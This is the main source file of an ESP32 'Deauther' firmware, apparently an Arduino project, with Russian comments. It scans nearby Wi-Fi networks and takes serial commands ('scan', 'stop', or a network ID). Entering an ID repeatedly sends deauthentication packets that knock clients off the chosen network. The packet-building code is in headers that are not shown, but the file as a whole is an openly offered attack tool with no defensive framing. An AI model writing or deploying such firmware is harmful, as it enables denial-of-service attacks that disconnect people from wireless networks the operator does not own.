#include <Arduino.h>
#include <WiFi.h>
#include "config.h"
#include "scan.h"
#include "deauth.h"

void setup() {
    Serial.begin(SERIAL_BAUD);
    delay(1000);
    
    Serial.println("ESP32 Deauther Started");
    
    // Начальный скан
    scanNetworks();
}

void loop() {
    // Обработка атаки
    if (isAttacking) {
        sendDeauthPackets();
    }
    
    // Обработка команд из Serial
    if (Serial.available() > 0) {
        String input = Serial.readStringUntil('\n');
        input.trim();
        
        if (input.equalsIgnoreCase("scan")) {
            stopDeauth();
            scanNetworks();
        } 
        else if (input.equalsIgnoreCase("stop")) {
            stopDeauth();
        } 
        else {
            // Проверяем, число ли это
            int id = input.toInt();
            if (id >= 0 && id < networkCount) {
                startDeauth(id);
            } else {
                Serial.println("Unknown command. Use: scan, stop, or <ID number>");
            }
        }
    }
}
